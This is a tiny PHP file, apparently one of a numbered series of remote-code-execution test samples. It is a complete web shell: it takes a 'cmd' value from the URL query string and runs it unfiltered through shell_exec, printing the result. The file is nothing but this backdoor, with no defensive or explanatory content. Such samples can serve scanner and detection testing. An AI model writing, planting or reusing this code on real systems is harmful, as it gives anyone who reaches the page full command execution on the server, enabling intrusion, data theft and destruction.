<?php
// RCE test variation #436
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>